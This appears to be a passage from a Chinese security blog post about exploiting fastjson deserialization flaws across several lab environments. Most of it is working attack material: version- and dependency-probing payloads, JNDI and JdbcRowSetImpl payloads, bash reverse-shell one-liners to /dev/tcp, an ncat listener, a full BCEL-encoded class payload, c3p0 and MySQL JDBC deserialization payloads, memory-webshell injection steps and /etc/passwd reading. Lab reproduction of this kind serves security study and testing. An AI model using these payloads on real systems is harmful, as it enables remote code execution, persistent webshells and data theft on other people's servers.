<p>拉取成功后会自动更新镜像列表(注意不要填错镜像地址，否则会卡在下载状态):</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513110210867.png"></p>
<h3 id="fastjson-1-2-24-vulhub"><a href="#fastjson-1-2-24-vulhub" class="headerlink" title="fastjson-1.2.24-vulhub"></a>fastjson-1.2.24-vulhub</h3><p>这是使用<code>vulnhub</code>中的<code>fastjson-1.2.24</code>环境，因为这个环境里没有太多可利用的依赖，所以主要利用方式是使用<code>JNDI</code>注入。在burp中先将GET请求转为POST请求，修改<code>Content-Type</code>为<code>application/json</code>，即可进行fastjson漏洞测试:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513152805106.png"></p>
<p><strong>版本判断</strong>:通过是否报错初步判断版本为<code>1.2.24</code>:</p>
<pre><code class="line-numbers language-json">//不报错:1.2.24 / 1.2.83，报错: 1.2.25-1.2.80
{"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}

//不报错:1.2.24-1.2.68，  报错: 1.2.70-1.2.83
{"zero":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}

//不报错:1.2.24, 报错: 1.2.25-1.2.83
{"zero": {"@type": "com.sun.rowset.JdbcRowSetImpl"}}
</code></pre>
<p><strong>依赖判断</strong>:通过探测依赖环境判断目标环境可以进行哪些攻击:</p>
<pre><code class="line-numbers language-json">// 通过缓存类判断(存在下列类)
// JdbcRowSetImpl
{"age":25,"name":{"z": {"@type": "java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"}}}
// TemplatesImpl
{"age":25,"name":{"z": {"@type": "java.lang.Class","val": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"}}}
// springframework
{"age":25,"name":{ "z": {"@type": "java.lang.Class","val": "org.springframework.web.bind.annotation.RequestMapping"}}}
// tomcat
{"age":25,"name":{ "z": {"@type": "java.lang.Class","val": "org.apache.catalina.startup.Tomcat"}}}

// 也可通过报错判断
{"age":25,"name":{"x": { "@type": "java.lang.Character"{ "@type": "java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"}}}
</code></pre>
<p>根据上述依赖判断后，可以先尝试进行JNDI注入，使用<code>JNDI-Injection-Exploit-Plus</code>工具启动对应服务:</p>
<pre><code class="line-numbers language-cmd">java -jar JNDI-Injection-Exploit-Plus-2.4-SNAPSHOT-all.jar -C "要执行的命令" -A x.x.x.x
</code></pre>
<p>这里要执行的命令使用反弹SHELL命令，因为存在特殊符号，在JAVA中使用<code>Runtime.getRuntime().exec()</code>要进行编码:</p>
<pre><code class="line-numbers language-tex">// 反弹shell命令
/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/6666 0&gt;&amp;1
/bin/bash -c exec 5&lt;&gt;/dev/tcp/x.x.x.x/888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done 

// https://r0yanx.com/tools/java_exec_encode/  通过在线网站进行编码
bash -c {echo,xxxx}|{base64,-d}|{bash,-i}

// 监听shell
ncat -lvp 6666 -k

// 保持shell不中断(需要自定义编写class) 
https://www.baifachuan.com/posts/bedb840d.html
// 手动编写Class
https://www.svenbeast.com/post/c0VE5mjC-/
// JAVA OS命令注入
https://b1ngz.github.io/java-os-command-injection-note/
</code></pre>
<p>工具有三种类型的利用方式，这里使用的是<code>JNDI Remote Refenrence Links</code>，且不知道目标环境的JDK版本，所以先尝试使用支持版本较多<code>JDK8</code>和<code>ldap</code>发送<code>Payload</code>:</p>
<pre><code class="line-numbers language-json">{"age":25,"name":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x.x.x.x:1389/remoteExploit8", "autoCommit":true}
}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513204239800.png"></p>
<p>此时在服务器上接收到了目标环境的反弹<code>shell</code>:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513204111525.png"></p>
<p>使用<code>JNDIExploit</code> 工具继续进行<code>Payload</code>的测试，可以在这个靶场中使用<code>/Basic/TomcatEcho</code>或<code>TomcatBypass/TomcatEcho</code>载荷执行命令回显:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240514152341695.png"></p>
<p>使用<code>/*/TomcatMemshell3</code>、<code>/*/GodzillaMemshell</code>注入冰蝎3或哥斯拉的内存马:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240514164108948.png"></p>
<h3 id="fastjson-1-2-45-jdk8u342"><a href="#fastjson-1-2-45-jdk8u342" class="headerlink" title="fastjson-1.2.45-jdk8u342"></a>fastjson-1.2.45-jdk8u342</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/1245-jdk8u342">FastJsonParty/1245-jdk8u342</a>进行环境搭建，需要绕过<code>JDK</code>高版本限制进行<code>JNDI</code>注入利用。主要可以利用<code>fastjson</code>原生反序列化链,通过原生反序列化漏洞执行字节码，实现内存马等功能。环境搭建完成后，可以访问<code>/tologin</code>进入登陆页面抓包，账户和密码通过<code>JSON</code>格式进行传输:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525153905537.png"></p>
<p>通过报错信息获取版本信息:</p>
<pre><code class="line-numbers language-json">{"@type": "java.lang.AutoCloseable"
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525155443715.png"></p>
<p>寻找高版本下可进行利用的类，首先可以利用类转换异常报错探测环境信息。当类不存在时，没有异常信息:</p>
<pre><code class="line-numbers language-json">{"x": {"@type": "java.lang.Character"{"@type": "java.lang.Class","val": "javax.el.ELProcessor"}}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525172306575.png"></p>
<p>当探测到存在可利用的类时，抛出异常:</p>
<pre><code class="line-numbers language-json">{"x": {"@type": "java.lang.Character"{"@type": "java.lang.Class","val": "org.apache.catalina.users.MemoryUserDatabaseFactory"}}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525172330904.png"></p>
<p>所以这个环境中还可以尝试<code>org.apache.catalina.UserDatabase</code>和<code>org.apache.catalina.users.MemoryUserDatabaseFactory</code>的写文件利用方式。这里就直接使用<code>fastjson</code>原生反序列化利用链，通过<code>java -jar JNDIBypass.jar -a 0.0.0.0 -p 1388 -ms behinder_shell</code>启动<code>ldap</code>服务，然后使用1.2.47的<code>POC</code>:</p>
<pre><code class="line-numbers language-json">{"1": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "2": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x:1388/J13Rf", "autoCommit": true}}
</code></pre>
<p>执行后服务端返回了<code>set property error, autoCommit</code>错误，但内存马已经成功注入：</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240525174424034.png"></p>
<h3 id="fastjson-1-2-47-dbcp-bcel"><a href="#fastjson-1-2-47-dbcp-bcel" class="headerlink" title="fastjson-1.2.47-dbcp-bcel"></a>fastjson-1.2.47-dbcp-bcel</h3><p><a target="_blank" rel="noopener" href="https://github.com/depycode/fastjson-local-echo">fastjson-local-echo</a>是一个在<code>fastjson1.2.47</code>和<code>tomcat-dbcp</code>依赖环境中进行命令执行回显测试的环境，可根据需要调整具体版本，适用的依赖环境和当前配置的依赖版本如下:</p>
<ul>
<li>fastjson &lt;= 1.2.24、1.2.33 &lt;= fastjson &lt;= 1.2.47</li>
<li>jdk &lt; 8u251</li>
<li>存在tomcat-dbcp依赖</li>
</ul>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163441279.png"></p>
<p>可以通过该项目测试基于<code>tomcat-dbcp</code>的<code>fastjson rce</code>回显，使用<code>Maven</code>的<code>package</code>命令将项目打包成<code>jar</code>包:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163748287.png"></p>
<p>然后使用<code>jdk8u241</code>版本启动<code>jar</code>包:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163838745.png"></p>
<p>如果是更高版本(JDK8u251)时，使用<code>DBCP+BCEL</code>利用方式时会抛出异常:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515163925461.png"></p>
<p><code>fastjson-local-echo</code>提供了<code>POC</code>和回显利用的代码。使用<code>jdk8u241</code>的<code>javac</code>将<code>SpringEcho.java</code>编译为<code>.class</code>文件，然后需要将其转换为<code>bcel</code>字节码编码格式，项目自带的<code>BCELEncode.java</code>似乎存在点问题没能输出完整的字符串，这里通过<a target="_blank" rel="noopener" href="https://github.com/flamingo-gx/Fastjson-BCELCoder/">Fastjson-BCELCoder</a>项目转换下即可:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515175829345.png"></p>
<p>然后就可以通过<code>bcel</code>和<code>SpringEcho</code>载荷进行命令执行回显了，使用<code>fastjson1.2.47</code>的POC:</p>
<pre><code class="line-numbers language-json">{
    "xx":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"
            }
        } : "xxx"
    }
}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240515183847518.png"></p>
<p>使用<code>JMG</code>生成冰蝎内存马:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240711110011633.png"></p>
<p>注入并连接成功:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240711110124343.png"></p>
<h3 id="fastjson-1-2-47-c3p0"><a href="#fastjson-1-2-47-c3p0" class="headerlink" title="fastjson-1.2.47-c3p0"></a>fastjson-1.2.47-c3p0</h3><p><a target="_blank" rel="noopener" href="https://github.com/depycode/fastjson-c3p0">fastjson-c3p0</a>项目是一个使用<code>fastjson1.2.47</code>和<code>c3p0</code>依赖进行不出网回显利用的测试环境:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516182325949.png"></p>
<p>对于<code>c3p0</code>的二次反序列化利用，首先通过<code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</code>类的<code>ReadObject()</code>触发第一次反序列化，然后利用其他本地反序列化链执行字节码，实现命令回显等功能。将项目通过<code>IDEA </code>打包成<code>JAR</code>包后启动，项目中使用了<code>commons-collections 3.1</code>依赖，所以可以使用项目中自带的<code>CC8</code>利用链(可以使用<code>ysoserial</code>工具生成)进行命令执行回显测试:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516190221667.png"></p>
<p>在上文<code>fastjson-1.2.45-jdk8u342</code>测试环境中我们针对高版本的<code>JDK</code>环境使用了<code>fastjson</code>原生反序列化利用链，那么同样也可以针对该环境写入内存马。在<code>fastjson-1.2.45-jdk8u342</code>环境中，是通过<code>JNDI</code>触发的反序列化漏洞，该环境的利用需要进行二次反序列化，所以需要拿到<code>JNDI</code>返回的反序列化载荷，然后通过<code>c3p0</code>的反序列化漏洞执行后续利用链。</p>
<p>第一步通过<code>JADX</code>反编译<code>JNDIBypass.jar</code>工具，可以找到<code>Base64</code>编码后的内存马载荷:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516190732124.png"></p>
<p>内存马访问地址和密码:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191519814.png"></p>
<p>第二步需要将载荷转换为<code>c3p0</code>需要的十六进制数据，编写处理代码如下:</p>
<pre><code class="line-numbers language-JAAV">import java.util.Base64;
public class Test {
    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuilder sb = new StringBuilder(length * 2);
        for (int i = 0; i &lt; length; ++i) {
            String sTemp = Integer.toHexString(255 &amp; bArray[i]);
            if (sTemp.length() &lt; 2) {
                sb.append(0);
            }
            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }
    public static void main(String[] args) {
        String base64String = "YourBase64StringHere";
String behinder_shell = "rO0ABXNyABFqYXZhLn...";
        byte[] byteArray = Base64.getDecoder().decode(behinder_shell);
        String hexString = bytesToHexString(byteArray, byteArray.length);
        System.out.println(hexString);
    }
}
</code></pre>
<p>执行代码后就可以得到十六进制数据了:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191027438.png"></p>
<p>将得到的数据填入POC对应位置（注意HEX数据末尾需要多一位，在<code>c3p0</code>代码中会移除最后一位）:</p>
<pre><code class="line-numbers language-JSOn">{"e":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"f":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:ACE...7878;"}}
</code></pre>
<p>现在就可以尝试写入内存马了，发送载荷之前访问下内存马地址<code>/behinder</code>，返回404:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191406209.png"></p>
<p>然后发送载荷，返回了500:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191329290.png"></p>
<p>此时内存马地址返回200，使用冰蝎v3链接成功:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240516191702203.png"></p>
<h3 id="fastjson-1-2-68-jdbc"><a href="#fastjson-1-2-68-jdbc" class="headerlink" title="fastjson-1.2.68-jdbc"></a>fastjson-1.2.68-jdbc</h3><p>通过<a target="_blank" rel="noopener" href="https://github.com/safe6Sec/ShiroAndFastJson">safe6Sec/ShiroAndFastJson</a>项目编译为<code>jar</code>包搭建测试环境，在项目中添加了常用的依赖并且预设了<code>payload</code>：</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240527182006316.png"></p>
<p>可以很方便的根据当前配置的测试环境在这个目录下来筛选可利用<code>payload</code>。</p>
<p>当前搭建的环境是在可出网的环境下使用<code>jar</code>包形式在<code>fastjson1.2.68</code>及<code>JDK8u251</code>环境中运行，没有<code>WEB</code>目录可以读文件或写<code>webshell</code>。根据上文介绍的内容，可以尝试下<code>JDBC</code>反序列化进行<code>RCE</code>。这里还是通过黑盒测试的方式来进行，先通过响应信息是否报错判断大致版本:</p>
<pre><code class="line-numbers language-json">// 不报错:1.2.24-1.2.68
{"zero":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240527153342118.png"></p>
<pre><code class="line-numbers language-json">// 报错: 1.2.48-1.2.83
{"a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "b": {"@type": "com.sun.rowset.JdbcRowSetImpl"}}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240527153418561.png"></p>
<p>得到版本范围在<code>1.2.48-1.2.68</code>之间，那么就可以使用1.2.68版本的<code>POC</code>。先利用报错<code>Payload</code>探测下<code>MySQL</code>依赖版本:</p>
<pre><code class="line-numbers language-JSON">/*
com.mysql.jdbc.Buffer  // mysql-jdbc-5
com.mysql.cj.api.authentication.AuthenticationProvider  // mysql-connect-6
com.mysql.cj.protocol.AuthenticationProvider // mysql-connect-8
org.springframework.web.bind.annotation.RequestMapping // SpringBoot回显 
*/

{
  "x": {
    "@type": "java.lang.Character"{
  "@type": "java.lang.Class",
  "val": "com.mysql.jdbc.Buffer"
    }
}
</code></pre>
<p>使用<code>mysql-connect-8</code>类时发现返回错误，说明存在<code>mysql-connect-8</code>依赖（只有8.0.19这个版本可以反序列化利用）:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528223727643.png"></p>
<p>在项目中搜索当前版本的<code>payload</code>，<code>repo:safe6Sec/ShiroAndFastJson path:/^src\/main\/java\/com\/shiro\/vuln\/fastjson\// 1.2.68</code>：</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528224016388.png"></p>
<p>所以还需要一个模拟<code>MySQL</code>服务器的工具<a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Server</a>。<code>MySQL_Fake_Server</code>建议在<code>Python3.7</code>下使用避免兼容问题，<code>MySQL_Fake_Server</code>的载荷行为通过<code>JDBC</code>链接信息中的<code>user</code>字段指定，可以通过配置文件进行预设，这部分项目中有详细介绍。先使用<code>MySQL_Fake_Server</code>读取下目标环境文件:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529134730335.png"></p>
<p>文件读取成功，但是目标<code>WEB</code>服务发起了很多次请求，导致写入了很多次文件:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529135000223.png"></p>
<p>继续执行反序列化的利用，在<code>MySQL_Fake_Server</code>中需要用到<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>工具生成反序列化的载荷，在fastjson的利用中通过<code>host</code>指定远程<code>MySQL</code>服务器，<code>user</code>参数标记要使用的反序列化载荷，如这里的<code>CC4</code>利用链执行命令<code>yso_CommonsCollections4_calc</code>:</p>
<pre><code class="line-numbers language-json">Content-Type: application/json; charset=UTF-8

{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
        "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
        "connectionUrl": {
            "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
            "masters": [{
                "host": "mysql.host"
            }],
            "slaves": [],
            "properties": {
                "host": "127.0.0.1",
                "user": "yso_CommonsCollections4_calc",
                "dbname": "dbname",
                "password": "pass",
                "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "autoDeserialize": "true"
            }
        }
    }
}
</code></pre>
<p>实际利用中仅执行命令满足不了需求，需要使用增强的<a target="_blank" rel="noopener" href="https://github.com/Y4er/ysoserial">ysoserial</a>工具来实现内存马等功能:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528231740068.png"></p>
<p>可以查看该工具的使用方法:</p>
<pre><code class="line-numbers language-cmd">// 原始执行命令版本
java -jar ysoserial.jar CommonsBeanutils192NOCC "calc" 
// 执行类注入内存马
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerMemShellFromThread"  # TomcatListenerMemShellFromThread
</code></pre>
<p>掌握了使用方法，接下来就需要修改下<code>MySQL_Fake_Server</code>的配置文件，使用<code>MemShell</code>用户名时便通过<code>ysoserial</code>返回内存马的利用载荷（<code>CommonsCollections4 CLASS:TomcatListenerMemShellFromThread</code>）:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528232121758.png"></p>
<p>另外在这个<code>ysoserial</code>工具中也有<code>fastjson</code>的原生反序列化利用链，同样可以实现内存马的注入:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529135652639.png"></p>
<p>修改完配置后重新启动<code>MySQL_Fake_Server</code>，然后发送<code>payload</code>：</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528233733859.png"></p>
<p><code>WEB</code>服务器和<code>MySQL_Fake_Server</code>显示如下:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528233704493.png"></p>
<p>然后就可以使用内存马了。内存马的使用方式还需要阅读下修改版本<code>ysoserial</code>内存马源码<a target="_blank" rel="noopener" href="https://github.com/Y4er/ysoserial/blob/main/src/main/java/ysoserial/payloads/templates/TomcatListenerMemShellFromThread.java">TomcatListenerMemShellFromThread.java</a>，先尝试下命令执行内存马:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528233934608.png"></p>
<p>根据代码逻辑需要添加请求头，进行命令执行并回显:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240528234126423.png"></p>
<p>内存马同样添加自定义的请求头即可:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529002202172.png"></p>
<h3 id="fastjson-1-2-68-writefile"><a href="#fastjson-1-2-68-writefile" class="headerlink" title="fastjson-1.2.68-writefile"></a>fastjson-1.2.68-writefile</h3><p><a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty">FastJsonParty</a>项目中有对<code>fastjson1.2.68</code>文件读写利用方式的环境和详细<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/FastJson1268%E5%86%99%E6%96%87%E4%BB%B6RCE%E6%8E%A2%E7%A9%B6.md">write-up</a>进行参考。这部分就来实际复现下<code>write-up</code>中写<code>webshell</code>、写计划任务、覆盖<code>charsets.jar</code>、写<code>Class</code>类几种通过写文件获取<code>RCE</code>的方式。</p>
<p><strong>写WEBSHELL</strong></p>
<p>写<code>webshell</code>的利用方式需要目标环境可解析<code>JSP</code>，使用<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/tree/main/1268-writefile-jsp">1268-writefile-jsp</a>环境进行测试。通过报错方式获取<code>fastjson</code>版本为1.2.68，并且可以得到是<code>tomcat8.5.95</code>:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529153627079.png"></p>
<p>探测下写文件依赖<code>org.apache.commons.io.Charsets</code>（2.6-）或<code>org.apache.commons.io.file.Counters</code>（2.7+）是否存在:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529160914835.png"></p>
<p>那么可以利用<code>commons-io-2.6</code>及以下Poc读写文件，先尝试读取<code>/etc/passwd</code>，通过返回错误内容判断是否成功读取文件，文件内容开头不是<code>root</code>时，返回<code>not close json text</code>:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529162105922.png"></p>
<p>文件内容开头为<code>root</code>时，返回<code> set property error</code>:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240529162001072.png"></p>
